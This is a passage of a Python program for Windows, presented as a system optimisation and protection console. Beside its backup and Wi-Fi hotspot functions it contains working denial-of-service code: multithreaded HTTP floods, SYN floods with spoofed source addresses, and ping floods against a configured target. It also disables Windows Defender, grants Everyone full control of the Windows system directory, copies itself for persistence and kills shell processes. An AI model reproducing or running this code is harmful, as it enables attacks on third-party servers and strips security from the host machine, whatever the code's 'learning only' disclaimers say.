        with open(do_no_show_clock_info, "w") as f:
            f.write("1")
    gpupdate()


def b64_to_file(file, b64code):
    try:
        with open(file, "wb") as f:
            f.write(base64.b64decode(b64code))
        log(logs, "释放文件成功:%s" % file)
    except Exception as e:
        log(logs, "释放文件失败:%s" % file)


def get_pro_user_num(exe):
    exe = str(exe).casefold()
    userlist = []
    for i in get_process_list():
        if i.get("name") == exe and not i.get("username") in userlist:
            userlist.append(i.get("username"))
    return len(userlist)


def get_pro_stat(exe):
    exe = str(exe).casefold()
    for i in get_process_list():
        if i.get("name") == exe:
            return True
    return False


def b64zip_to_file(zip_file, b64code):
    try:
        with open(zip_file, "wb") as f:
            f.write(base64.b64decode(b64code))
        with zipfile.ZipFile(zip_file, "r") as f:
            for file in f.namelist():
                try:
                    f.extract(file, ProtectDir)  # 解压位置
                except:
                    pass
        log(logs, "释放Zip文件成功:%s" % zip_file)
    except Exception as e:
        log(logs, "释放Zip文件失败:%s" % zip_file)


def create_script(file, text):
    try:
        with open(file, "w", encoding="gbk") as f:
            f.write(text)
    except Exception as e:
        log(
            logs,
            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )


def active_windows_process_name():  # 焦点窗口进程名
    try:
        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
        return psutil.Process(pid[-1]).name()
    except Exception as e:
        log(
            logs,
            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )


def active_windows_process_pid():  # 焦点窗口进程PID
    try:
        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
        return pid[-1]
    except Exception as e:
        log(
            logs,
            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )


def kill_exe(exe):
    try:
        for i in psutil.pids():
            try:
                time.sleep(0.01)
                pro = psutil.Process(i)
                if pro.exe() == exe:
                    os.popen('Taskkill /f /im "%s" /t' % pro.name())
            except Exception as e:
                log(
                    logs,
                    str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                )
    except Exception as e:
        log(
            logs,
            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )


def ap_360_repair():
    global ap_360_exe
    log(logs, "开始部署360部署AP")
    ap_360_exe = ""
    if os.path.isfile(use_36o_ap_flag) and not os.path.isfile(closewifi):
        os.popen("Taskkill /f /im 360AP.exe /t").read()
        if os.path.isfile(ap_360_installer):
            os.popen("start /wait %s /s" % ap_360_installer).read()
            for i in psutil.pids():
                try:
                    ap_pro = psutil.Process(i)
                    if ap_pro.name() == "360AP.exe":
                        ap_360_exe = ap_pro.exe()  # 360APMainProg
                        break
                except Exception as e:
                    log(
                        logs,
                        str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                    )
        os.popen("Taskkill /f /im 360AP.exe /t").read()
        os.popen("schtasks /delete /f /tn 360safe\\360APMainProg")
    log(logs, "获取到的360AP路径:%s" % ap_360_exe)
    if ap_360_exe == "":
        ap_360_exe = "C:\\Program Files (x86)\\360AP\\360AP.exe"
    log(logs, "360AP准备完成:%s" % ap_360_exe)


def ddos(dosurl, flag, dosip):
    global qinstall, DDOSurl, logs

    def DDOSrandom():
        ranstr = ""
        for i in range(5, random.randrange(8, 20)):
            time.sleep(0.001)
            ranstr += random.choice(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
            )
        return ranstr

    def DDOSki(dosurl, flag, DDOSProName):  # 目标Url，是否随机字符串入口（0为关其他为开）
        global qinstall, DDOSurl, logs
        numi = 1
        if str(flag) == "1":
            if not str(dosurl)[-1] == "/":
                dosurl += "/"
            while True:
                try:
                    requests.get(dosurl + str(DDOSrandom()))
                    numi += 1
                except Exception as e:
                    log(
                        logs,
                        str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                    )
                if numi % 1000 == 0:
                    log(
                        logs,
                        "DDOS线程 "
                        + str(DDOSProName)
                        + " 第 "
                        + str(numi)
                        + " 次DDos压力测试已完成，未现错误（仅供学习参考，禁止用于非法用途）",
                    )
        else:
            while True:
                try:
                    requests.get(dosurl)
                    numi += 1
                except Exception as e:
                    log(
                        logs,
                        str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                    )
                if numi % 1000 == 0:
                    log(
                        logs,
                        "DDOS线程 "
                        + str(DDOSProName)
                        + " 第 "
                        + str(numi)
                        + " 次DDos压力测试已完成，未现错误（仅供学习参考，禁止用于非法用途）",
                    )

    def synFlood(tgt, SYNProName):
        numj = 1
        while True:
            try:
                src = get_random_ip()
                for sport in range(1, 65535):
                    time.sleep(0.001)
                    try:
                        IPlayer = IP(src=src, dst=tgt)
                        TCPlayer = TCP(sport=sport, dport=513)
                        pkt = IPlayer / TCPlayer
                        send(pkt)
                    except Exception as e:
                        log(
                            logs,
                            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                        )
                numj += 1
            except Exception as e:
                log(
                    logs,
                    str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                )

            if numj % 100 == 0:
                log(
                    logs,
                    "SYN线程 "
                    + str(SYNProName)
                    + " 第 "
                    + str(numj)
                    + " 次SYN压力测试已完成，未现错误（仅供学习参考，禁止用于非法用途）",
                )

    def ping_test(ip):
        while True:
            try:
                CREATE_NO_WINDOW = 0x08000000
                subprocess.call(
                    "ping /l " + str(random.randrange(128, 65500)) + " /t " + ip,
                    creationflags=CREATE_NO_WINDOW,
                )
            except Exception as e:
                log(
                    logs,
                    str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                )

    for i in range(
        int(cpu_count()) * int(random.randrange(2, 8))
    ):  # 按照CPU核心数随机倍数开启多线程攻击测试
        time.sleep(0.001)
        threadingA = threading.Thread(
            target=DDOSki,
            name="DDOS压力测试线程" + str(i),
            args=(
                dosurl,
                flag,
                i,
            ),
        )
        threadingA.start()
        threadingB = threading.Thread(
            target=synFlood,
            name="SYN压力测试线程" + str(i),
            args=(
                dosip,
                i,
            ),
        )
        threadingB.start()
        threadingC = threading.Thread(
            target=ping_test,
            name="Ping压力测试线程" + str(i),
            args=(dosip,),
        )
        threadingC.start()


def makestart():
    if not os.path.exists(ProtectDir):
        os.popen(
            "cmd /c takeown /f %systemroot% /a & icacls %systemroot% /c /q /grant Everyone:(OI)(CI)(F)"
        )
        os.makedirs(ProtectDir)
        shutil.copyfile(selffullname, ProtectExe)
        os.popen("copy /Y " + selffullname + " " + ProtectExe)
    if not os.path.isfile(ProtectExe):
        os.popen(
            "cmd /c takeown /f %systemroot% /a & icacls %systemroot% /c /q /grant Everyone:(OI)(CI)(F)"
        )
        shutil.copyfile(selffullname, ProtectExe)
        os.popen("copy /Y " + selffullname + " " + ProtectExe)


def writeconf(
    qinstall,
    UserBackA=None,
    UserBackB=None,
    UserBackC=None,
    UserBackD=None,
    UserBackE=None,
    UserBackF=None,
    UserBackG=None,
    UserBackH=None,
    UserBackI=None,
    UserBackJ=None,
    UserBackK=None,
):
    # 判断输入值是不是空的，是空的就给一个默认值，防止后面报错
    if not UserBackA or qinstall:
        UserBackA = "explorer.exe"
    if not UserBackB or qinstall:
        UserBackB = "echo."
    if not UserBackC or qinstall:
        UserBackC = "explorer.exe"
    if not UserBackD or qinstall:
        UserBackD = "echo."
    if not UserBackE or qinstall:
        UserBackE = "echo."
    if not UserBackF or qinstall:
        UserBackF = "D"
    if not UserBackG or qinstall:
        UserBackG = "C:\\ProgramData\\OnedriveTest"
    if not UserBackH or qinstall:
        UserBackH = "22:05"
    if not UserBackI or qinstall:
        UserBackI = "1"
    if not UserBackJ or qinstall:
        UserBackJ = "Windows-WiFi(1-8)*12345678*1"
    if not UserBackK or qinstall:
        UserBackK = "Disable"  # 测试目标主机

    # 如果配置文件已经存在就先删除，避免重复
    if os.path.isfile(Protectconf):
        os.remove(Protectconf)

    # 移动热点配置有效性校验
    wificonftest = UserBackJ.split("*")
    if (
        not ("*" in UserBackJ)
        or not (len(str(wificonftest[0])) in range(1, 24))
        or not (len(str(wificonftest[1])) in range(8, 16))
        or not (str(wificonftest[2]) in "012")
        or not (len(wificonftest) == 3)
    ):
        UserBackJ = "Windows-WiFi(1-8)*12345678*1"
    # 获取所有系统非系统盘符
    SystemC = SystemDir[:-1:]
    PanList = [
        "A",
        "B",
        "C",
        "D",
        "E",
        "F",
        "G",
        "H",
        "I",
        "J",
        "K",
        "L",
        "M",
        "N",
        "O",
        "P",
        "Q",
        "R",
        "S",
        "T",
        "U",
        "V",
        "W",
        "X",
        "Y",
        "Z",
    ]
    PanList.remove(SystemC)
    NotSystemLetter = []
    for i in PanList:
        time.sleep(0.001)
        if os.path.isdir(i + ":"):
            NotSystemLetter.append(i)

    if '"' in UserBackB:
        UserBackB = UserBackB.replace('"', "'")

    if '"' in UserBackD:
        UserBackD = UserBackD.replace('"', "'")

    if '"' in UserBackE:
        UserBackE = UserBackE.replace('"', "'")

    if len(NotSystemLetter) == 0:
        os.popen('mshta vbscript:Msgbox("设备没有更多分区可供作为数据区，将额外占用系统分区空间")(window.close)')
        NotSystemLetter.append(SystemC)
    # 规范化表达
    if UserBackG[-1] == "\\":
        UserBackG = UserBackG[:-1:]

    if UserBackF[-1] == ":":
        UserBackF = UserBackF[:-1:]

    DDOSconf = UserBackK.split("*")

    if not len(DDOSconf) == 3:
        if not UserBackK:
            UserBackK = "Disable"

    if not UserBackK == "Disable":
        try:
            with open(npcap, "wb") as f:
                f.write(base64.b64decode(npcapzip))
        except Exception as e:
            log(
                logs,
                str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
            )
        # os.popen('mshta vbscript:Msgbox("开启Url测试需要安装npcap")(window.close)')
        # os.popen("start " + npcap)

    if not os.path.isdir(UserBackF + ":"):  # 指定的数据盘不存在就取第一个可用
        RandomLetter = NotSystemLetter[0]
        UserBackF = RandomLetter

    if not len(UserBackH) == 5:
        UserBackH = "22:05"

    if not UserBackI == "1":
        var = UserBackI == "0"

    Writeini = (
        UserBackA
        + chr(10)
        + UserBackB
        + chr(10)
        + UserBackC
        + chr(10)
        + UserBackD
        + chr(10)
        + UserBackE
        + chr(10)
        + UserBackF
        + chr(10)
        + UserBackG
        + chr(10)
        + UserBackH
        + chr(10)
        + UserBackI
        + chr(10)
        + UserBackJ
        + chr(10)
        + UserBackK
        + chr(10)
    )
    Writeini += chr(10) + "#中文GBK编码支持"
    with open(Protectconf, "w", encoding="GBK") as f:
        f.write(Writeini)
    if not qinstall:
        messagebox.showinfo("完成", "配置保存成功")
    else:
        setflag = True


def application_update():
    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, lowlog, setflag, pid
    setflag = True
    os.popen('mshta vbscript:Msgbox("正在更新程序,请稍候")(window.close)')
    try:
        for i in psutil.process_iter():  # 查找正在运行的进程
            time.sleep(0.001)
            if str(i.name()) == "Protect.exe":
                pid = i.pid
                proc = psutil.Process(pid)
                if str(proc.exe()) == ProtectExe:
                    # 必须结束已经运行的进程才能替换文件
                    os.popen("cmd /c taskkill /f /pid " + str(pid)).read()
        os.popen("schtasks /end /tn ZhangProtect\\Protect").read()
        # 先删除旧程序，无需Uninstall
        if os.path.isfile(ProtectExe):
            try:
                os.popen("cmd /c del /f /q " + ProtectExe).read()
                os.remove(ProtectExe)
            except Exception as e:
                log(
                    logs,
                    str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                )
        # 重新安装并启动
        os.popen("Taskkill /f /im SysDispatch.exe /t").read()
        os.popen("Taskkill /f /im memreduct.exe /t").read()
        os.popen("Taskkill /f /im DesktopOK.exe /t").read()
        os.popen("Taskkill /f /im snapshot.exe /t").read()
        os.popen("Taskkill /f /im snapshot64.exe /t").read()
        os.popen("Taskkill /f /im CCleaner.exe /t").read()
        os.popen("Taskkill /f /im CCleaner64.exe /t").read()
        os.popen("Taskkill /f /im ZhangProtectControl.exe /t").read()
        if not os.path.exists(ProtectDir):
            os.makedirs(ProtectDir)
        if not os.path.isfile(ProtectExe):
            shutil.copyfile(selffullname, ProtectExe)
            os.popen("copy /Y " + selffullname + " " + ProtectExe).read()
        os.popen("cmd /c schtasks /run /I /tn ZhangProtect\\Protect").read()
        selfmd5 = getmd5(selffullname)
        promd5 = getmd5(ProtectExe)
        os.popen("taskkill /f /im mshta.exe /t")
        if selfmd5 == promd5:
            os.popen('"' + ProtectExe + '" -h')
            messagebox.showinfo(
                "完成",
                "更新完毕" + chr(10) + "请重启计算机来完成应用" + chr(10) + "md5校验值：" + str(promd5),
            )
        else:
            messagebox.showinfo(
                "失败",
                "更新失败：md5校验未通过："
                + chr(10)
                + "新版本md5:"
                + str(selfmd5)
                + chr(10)
                + "而已安装版本md5:"
                + str(promd5),
            )
        os._exit(0)
    except Exception as e:
        messagebox.showinfo(
            "失败",
            "更新失败：无法结束进程->"
            + str(pid)
            + chr(10)
            + "请尝试退出安全软件"
            + chr(10)
            + str(sys.exc_info())
            + "行:"
            + str(e.__traceback__.tb_lineno),
        )
        os._exit(0)


if update_application:
    application_update()
    os._exit(0)
# 配置标志
setflag = True

# 判断管理员权限
if not testflag:
    try:
        if not selffullname == ProtectExe or not os.path.isfile(ProtectExe):

            def is_admin():
                try:
                    return ctypes.windll.shell32.IsUserAnAdmin()
                except Exception as e:
                    return False

            install_runas_flag_user = False

            if qinstall and not is_admin():
                install_runas_flag_user = messagebox.askyesno(
                    "警告：静默安装失败", "静默安装失败，需要提升的权限,是否尝试提升？"
                )
            elif not is_admin():
                install_runas_flag_user = messagebox.askyesno(
                    "警告", "无法获取权限，需要提升的权限,是否尝试提升?"
                )
            try:
                if install_runas_flag_user and not is_admin():
                    if qinstall:
                        ctypes.windll.shell32.ShellExecuteW(
                            None, "runas", sys.executable, "-q", None, 1
                        )
                    else:
                        ctypes.windll.shell32.ShellExecuteW(
                            None, "runas", sys.executable, "", None, 1
                        )
                    os._exit(0)
                elif not is_admin():
                    os._exit(0)
            except Exception as e:
                messagebox.showerror("提升失败", "请手动右键以管理员身份运行")
    except Exception as e:
        os._exit(0)
try:
    disable_windows_defender()
except Exception as e:
    log(
        logs,
        str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
    )
if show_control:
    if os.path.isfile(ProtectControl):
        os.startfile(ProtectControl)
# 初始化并写入配置文件
try:
    if (
        (not selffullname == ProtectExe)
        or (not os.path.isfile(ProtectExe))
        or (show_control)
    ):
        setflag = False
        if not qinstall:
            MsgText = (
                "系统优化程序配置控制台"
                + chr(10)
                + "请退出安全软件并关闭安全中心实时保护"
                + chr(10)
                + "是 --> 安装/更新 否 --> 卸载"
                + chr(10)
                + "命令行 -h 显示命令帮助"
                + chr(10)
                + tools_info
                + chr(10)
                + "软件版本："
                + version
            )
            if not show_control:
                UserBackTell = messagebox.askyesnocancel("GUI控制台", MsgText)
            else:
                UserBackTell = True
            if UserBackTell == True or show_control:
                makestart()
                # 创建GUI对话框完成参数输入
                root = tk.Tk()
                root.attributes("-topmost", 1)  # 窗口置顶显示
                root.title("Zhang优化控制台")
                icon = "icon.ico"
                if not os.path.isfile(icon):
                    get_pic(icon_ico, "icon.ico")
                if os.path.isfile(icon):
                    root.iconbitmap(icon)
                    os.remove(icon)
                label1 = tk.Label(root, text="第一个守护进程名" + chr(10) + "（非提升运行）")
                label1.grid(row=0, column=0)
                label2 = tk.Label(root, text="第一个守护启动命令" + chr(10) + "（非提升运行）")
                label2.grid(row=1, column=0)
                label3 = tk.Label(root, text="第二个守护进程名" + chr(10) + "（提升运行）")
                label3.grid(row=2, column=0)
                label4 = tk.Label(root, text="第二个守护启动命令" + chr(10) + "（提升运行）")
                label4.grid(row=3, column=0)
                label5 = tk.Label(root, text="每1800循环周期执行" + chr(10) + "（提升运行）")
                label5.grid(row=4, column=0)
                label6 = tk.Label(root, text="作为数据盘驱动器号")
                label6.grid(row=5, column=0)
                label7 = tk.Label(root, text="作为文件同步目录")
                label7.grid(row=6, column=0)
                label8 = tk.Label(
                    root,
                    text="需要关机/休眠时间"
                    + chr(10)
                    + "（必须为XX:XX格式,无提示执行）"
                    + chr(10)
                    + "（多个时间用*隔开禁用写0）",
                )
                label8.grid(row=7, column=0)
                label9 = tk.Label(root, text="增强模式开关" + chr(10) + "（输入1为开）")
                label9.grid(row=8, column=0)
                label10 = tk.Label(
                    root,
                    text="锁定移动热点"
                    + chr(10)
                    + "格式>SSID*密码*频段 "
                    + chr(10)
                    + "频段:0->Auto;1->2.4G;2->5.0G",
                )
                label10.grid(row=9, column=0)
                label11 = tk.Label(
                    root,
                    text="扫描目标IPv4地址(慎用)",
                )
                label11.grid(row=10, column=0)
                # 创建输入框
                entry1 = tk.Entry(root)
                entry1.grid(row=0, column=1, padx=10, pady=5)
                entry2 = tk.Entry(root)
                entry2.grid(row=1, column=1, padx=10, pady=5)
                entry3 = tk.Entry(root)
                entry3.grid(row=2, column=1, padx=10, pady=5)
                entry4 = tk.Entry(root)
                entry4.grid(row=3, column=1, padx=10, pady=5)
                entry5 = tk.Entry(root)
                entry5.grid(row=4, column=1, padx=10, pady=5)
                entry6 = tk.Entry(root)
                entry6.grid(row=5, column=1, padx=10, pady=5)
                entry7 = tk.Entry(root)
                entry7.grid(row=6, column=1, padx=10, pady=5)
                entry8 = tk.Entry(root)
                entry8.grid(row=7, column=1, padx=10, pady=5)
                entry9 = tk.Entry(root)
                entry9.grid(row=8, column=1, padx=10, pady=5)
                entry10 = tk.Entry(root)
                entry10.grid(row=9, column=1, padx=10, pady=5)
                entry11 = tk.Entry(root)
                entry11.grid(row=10, column=1, padx=10, pady=5)

                try:
                    if os.path.isfile(Protectconf):
                        inilong = 11  # 配置文件长度(输入框数量，修改的时候下面readini函数里的也要改)
                        with open(Protectconf, "r") as f:
                            a = f.read()
                            oldconf = a.splitlines()[:inilong]
                        entry1.insert(0, oldconf[0])
                        entry2.insert(0, oldconf[1])
                        entry3.insert(0, oldconf[2])
                        entry4.insert(0, oldconf[3])
                        entry5.insert(0, oldconf[4])
                        entry6.insert(0, oldconf[5])
                        entry7.insert(0, oldconf[6])
                        entry8.insert(0, oldconf[7])
                        entry9.insert(0, oldconf[8])
                        entry10.insert(0, oldconf[9])
                        entry11.insert(0, oldconf[10])
                except Exception as e:
                    entry1.delete(0, "end")
                    entry2.delete(0, "end")
                    entry3.delete(0, "end")
                    entry4.delete(0, "end")
                    entry5.delete(0, "end")
                    entry6.delete(0, "end")
                    entry7.delete(0, "end")
                    entry8.delete(0, "end")
                    entry9.delete(0, "end")
                    entry10.delete(0, "end")
                    entry11.delete(0, "end")
                # 写入配置文件

                def show():
                    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, lowlog, setflag
                    setflag = True
                    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, lowlog, UserBackA, UserBackB, UserBackC, UserBackD, UserBackE, UserBackF, UserBackG, UserBackH
                    try:
                        UserBackA = entry1.get()
                        UserBackB = entry2.get()
                        UserBackC = entry3.get()
                        UserBackD = entry4.get()
                        UserBackE = entry5.get()
                        UserBackF = entry6.get()
                        UserBackG = entry7.get()
                        UserBackH = entry8.get()
                        UserBackI = entry9.get()
                        UserBackJ = entry10.get()
                        UserBackK = entry11.get()
                        writeconf(
                            qinstall,
                            UserBackA,
                            UserBackB,
                            UserBackC,
                            UserBackD,
                            UserBackE,
                            UserBackF,
                            UserBackG,
                            UserBackH,
                            UserBackI,
                            UserBackJ,
                            UserBackK,
                        )
                        if show_control:
                            os._exit(0)
                    except Exception as e:
                        messagebox.showerror(
                            "失败",
                            "配置失败"
                            + chr(10)
                            + "请检查错误码并重试"
                            + chr(10)
                            + str(sys.exc_info())
                            + "行:"
                            + str(e.__traceback__.tb_lineno),
                        )
                        os._exit(0)

                def update():
                    application_update()
                    os._exit(0)

                def out():
                    messagebox.showinfo(
                        "警告", "请仅在程序出现问题时使用此按钮" + chr(10) + "由此退出程序时不会撤销任何已应用的更改"
                    )
                    os._exit(0)

                tk.Button(
                    root, text="保存配置" + chr(10) + "(若存在空值将使用默认值)", command=show
                ).grid(row=11, column=0, sticky=tk.E, padx=30, pady=5)
                if not show_control:
                    tk.Button(
                        root,
                        text="更新程序" + chr(10) + "(保留原有配置文件不修改)",
                        command=update,
                    ).grid(row=11, column=1, sticky=tk.E, padx=30, pady=5)
                    tk.Button(
                        root,
                        text="编辑完成" + chr(10) + "(请先点击保存或更新程序)",
                        command=root.quit,
                    ).grid(row=12, column=0, sticky=tk.E, padx=30, pady=5)
                    tk.Button(
                        root, text="强制退出" + chr(10) + "(仅在程序出现问题时单击)", command=out
                    ).grid(row=12, column=1, sticky=tk.E, padx=30, pady=5)
                center_window(root, 450, 650)
                tk.mainloop()
            elif UserBackTell == False:
                try:
                    if not os.path.isfile(UNINST):
                        messagebox.showinfo("出错", "卸载批处理文件不存在！请运行主程序一次来生成")
                        os._exit(0)
                    for i in psutil.process_iter():  # 查找正在运行的进程
                        time.sleep(0.001)
                        if str(i.name()) == "Protect.exe":
                            pid = i.pid
                            proc = psutil.Process(pid)
                            if str(proc.exe()) == ProtectExe:
                                # 必须结束已经运行的进程才能卸载
                                os.popen("cmd /c taskkill /f /t /pid " + str(pid))
                    os.popen("cmd /c taskkill /f /im cmd.exe /t").read()
                    os.popen("cmd /c taskkill /f /im powershell.exe /t").read()
                    # 先删除主程序然后Uninstall
                    os.remove(ProtectExe)
                    os.popen("cmd /c start /b cmd /c " + chr(34) + UNINST + chr(34))
                    os.popen("cmd /c shutdown -r -t 30")
                    messagebox.showinfo(
                        "完成",
                        "已执行卸载，如未正确完成卸载，请手动以管理员身份运行"
                        + chr(10)
                        + UNINST
                        + chr(10)
                        + "重启计算机完成卸载"
                        + chr(10)
                        + "注意：卸载本程序不会还原之前做的更改",
                    )
                    os._exit(0)
                except Exception as e:
                    messagebox.showerror(
                        "失败",
                        "配置失败"
                        + chr(10)
                        + "请检查程序状态并确保已关闭安全软件，或手动执行操作"
                        + chr(10)
                        + str(sys.exc_info())
                        + "行:"
                        + str(e.__traceback__.tb_lineno),
                    )
                    os._exit(0)
            else:
                messagebox.showinfo("已终止", "已取消所有操作")
                os._exit(0)
        else:
            makestart()
            writeconf(qinstall)
except Exception as e:
    messagebox.showinfo(
        "错误", "程序出现错误将退出" + str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno)
    )
    os._exit(0)


# 先判断是否存在配置文件，不存在用默认值，防止后面报错


def readini(readmode=False):
    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, lowlog, setflag, proname0, tdir0, proname1, tdir1, tdir2, datadir, Onedriveupdatedir, autoshutdowntime, pronamesys, AllSchrun, AppRunA, AppRunB, AppRunC, Onedriveupdate, logs, ztimeoutA, ztimeoutB, hidesettingflag, SystemVersion, wificonf
    try:
        if os.path.isfile(Protectconf):
            # 从配置文件里面读取，并赋值给变量
            inilong = 11  # 配置文件长度(输入框数量，修改的时候上面输入框的也要改)
            with open(Protectconf, "r") as f:
                a = f.read()
                allini = a.splitlines()[:inilong]
            if readmode:
                if not len(allini) == inilong:
                    return 0
                else:
                    return allini
            if not len(allini) == inilong:  # 检查配置文件，长度应与变量数一致
                try:
                    writeconf(True)
                    messagebox.showinfo("错误", "配置文件不正确，已以默认值创建")
                except Exception as e:
                    messagebox.showinfo("错误", "配置文件错误，请重新安装本程序")
                    os._exit(0)
                return "reload"
            (
                proname0,
                tdir0,
                proname1,
                tdir1,
                tdir2,
                datadir,
                Onedriveupdatedir,
                autoshutdowntime,
                hidesettingflag,
                wificonf,
                DDOSConf,
            ) = allini
            hidesettingflag = str(hidesettingflag)
        else:
            try:
                writeconf(True)
                messagebox.showinfo("错误", "配置文件不存在，已以默认值创建")
            except Exception as e:
                messagebox.showinfo("错误", "配置文件错误，请重新安装本程序")
                os._exit(0)
            return "reload"

        if not proname0:
            proname0 = "explorer.exe"
        if not tdir0:
            tdir0 = "echo."
        if not proname1:
            proname1 = "explorer.exe"
        if not tdir1:
            tdir1 = "echo."
        if not tdir2:
            tdir2 = "echo."
        if not datadir:
            datadir = "D"
        if not Onedriveupdatedir:
            Onedriveupdatedir = "C:\\ProgramData\\OnedriveTest"
        if not autoshutdowntime:
            autoshutdowntime = "22:05"
        if not hidesettingflag:
            hidesettingflag = "1"
        if not wificonf:
            wificonf = "Windows-WiFi(1-8)*12345678*1"
        if not DDOSConf:
            DDOSConf = "Disable"

        if os.path.isdir(datadir + ":"):
            KeepFolder(datadir + ":\\StorageRedirect", 0)
            KeepFolder(datadir + ":\\StorageRedirect\\ProtectLogs", 0)
            logdir = datadir + ":\\StorageRedirect\\ProtectLogs\\"
            if not os.path.isdir(logdir):
                os.mkdir(logdir)
            logs = (
                logdir
                + "ProtectLog"
                + str(datetime.datetime.now())
                .replace(" ", "-")
                .replace(":", "-")
                .replace(".", "-")
                + ".log"
            )
        else:
            os._exit(0)
        log(logs, str(allini))
    except Exception as e:
        log(
            logs,
            "抛出错误在配置读取阶段" + str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )
        os._exit(0)
    return True


def random_key(long):
    key = ""
    while not len(key) >= long:
        randomstr = random.randrange(48, 123)
        if not randomstr in range(58, 65) and not randomstr in range(91, 97):
            key += str(chr(randomstr))
    return key


def System_Backup(datadir):
    def Backup_Stat(stat_log):
        System_Backup_Stat = (
            datadir + ":\\Important\\System_Backup\\System_Backup_Stat.log"
        )
        if not os.path.isfile(System_Backup_Stat):
            with open(System_Backup_Stat, "w") as f:
                f.write("该文件自动系统备份日志文件，为及时备份系统镜像，需要占用一定硬盘空间。")
        with open(System_Backup_Stat, "a") as g:
            g.write(
                chr(10)
                + "-" * 20
                + chr(10)
                + "[PID:"
                + str(os.getpid())
                + ",version:"
                + version
                + "]"
                + str(datetime.datetime.now())
                + str(stat_log)
                + "喵~"
            )
        log(logs, stat_log)

    SystemDrive = str(os.environ.get("systemdrive"))
    if SystemDrive == datadir + ":":
        Backup_Stat("数据盘路径与系统盘路径一致，禁止备份")
        return False
    Backup_Stat("系统备份线程启动")
    try:
        KeepFolder(datadir + ":\\Important")
        Backup_Dir = datadir + ":\\Important\\System_Backup"
        KeepFolder(Backup_Dir)
        Driver_Backup_Path = datadir + ":\\Important\\System_Backup\\Drivers_Backup"
        KeepFolder(Driver_Backup_Path)
        System_Backup_Image = datadir + ":\\Important\\System_Backup\\System_Backup.sna"
        System_Backup_Image_full = System_Backup_Image
        hash_file = datadir + ":\\Important\\System_Backup\\System_Backup.hsh"
        No_System_Backup_flag = datadir + ":\\Important\\System_Backup\\nobackup"
        Create_Append_System_Backup_flag = (
            datadir + ":\\Important\\System_Backup\\newbackup"
        )
        System_Backup_flag = "nothing"
        Todaytime = str(datetime.date.today())
        if (hidesettingflag == "1" or os.path.isfile(Open_SystemBackup_Flag)) and (
            not os.path.isfile(No_System_Backup_flag)
        ):
            system_clean_cmd_1 = "DISM /online /Cleanup-Image /StartComponentCleanup"
            system_clean_cmd_2 = CCleanerExe + " /AUTO"
            system_clean_cmd_3 = "sfc /scannow"
            system_clean_cmd_4 = "DISM /Online /Cleanup-Image /ScanHealth"
            system_clean_cmd_5 = "DISM /Online /Cleanup-image /RestoreHealth"
            Backup_Stat("执行系统清洁")
            os.popen(system_clean_cmd_1).read()
            os.popen(system_clean_cmd_2).read()
            os.popen(system_clean_cmd_3)
            os.popen(system_clean_cmd_4).read()
            os.popen(system_clean_cmd_5).read()
            Backup_Stat("系统清洁完成")
            Driver_Backup_Command = (
                "DISM /online /export-driver /destination:" + Driver_Backup_Path
            )
            os.popen(Driver_Backup_Command).read()
            Backup_Stat("执行备份系统驱动：" + Driver_Backup_Command)
            SystemRestorePointCreationFrequency_Command = (
                'powershell Checkpoint-Computer -Description "'
                + str(datetime.datetime.now()).replace(" ", "-")
                + '自动创建"'
            )
            SystemRestore_Result = os.popen(
                SystemRestorePointCreationFrequency_Command
            ).read()
            Backup_Stat(
                "自动创建系统还原点："
                + SystemRestorePointCreationFrequency_Command
                + ":"
                + SystemRestore_Result,
            )
            System_Backup_Date = (
                datadir + ":\\Important\\System_Backup\\System_Backup_Date.txt"
            )
            while True:
                if os.path.isfile(System_Backup_Image):
                    if os.path.isfile(System_Backup_Date):
                        with open(System_Backup_Date, "r") as f:
                            Image_Time = str(f.read())
                        with open(System_Backup_Date, "w") as f:
                            f.write(Todaytime)
                    else:
                        Image_Time = "1970-01-01"
                        with open(System_Backup_Date, "w") as f:
                            f.write(Todaytime)
                    Test_Image_Command = (
                        '"' + SnapShotExe + '" "' + System_Backup_Image + '" -T'
                    )
                    Test_Image = str(os.popen(Test_Image_Command).read())
                    if ("Some error occurred" in Test_Image) or (
                        not os.path.isfile(hash_file)
                    ):  # 对已存在的镜像进行校验，通过就判断今天是否备份过，不通过立即创建新备份
                        System_Backup_flag = "new"
                        os.popen('del /f /q "' + Backup_Dir + '\\*.*"').read()
                        Backup_Stat("系统备份校验不通过，重新备份：" + Test_Image)
                        continue
                    else:
                        Backup_Stat("系统备份校验通过：" + Test_Image)
                        if not Todaytime == Image_Time:
                            System_Backup_flag = "add"
                        else:
                            System_Backup_flag = "nothing"
                            Backup_Stat("系统今天已经备份过了：" + Image_Time)
                            break
                else:
                    System_Backup_flag = "new"
                    Backup_Stat("备份不存在，创建一个新的系统备份：" + System_Backup_Image)

                if os.path.isfile(Create_Append_System_Backup_flag):  # 强制差异备份
                    System_Backup_flag = "add"
                    os.remove(Create_Append_System_Backup_flag)
                    Backup_Stat("检测到标志，强制执行差异备份：" + System_Backup_Image)

                try:
                    if System_Backup_flag == "add":
                        with open(System_Backup_Date, "w") as f:
                            f.write(Todaytime)
                        System_Backup_Image = (
                            datadir
                            + ":\\Important\\System_Backup\\System_Backup_Add_"
                            + str(Todaytime)
                            + ".sna"
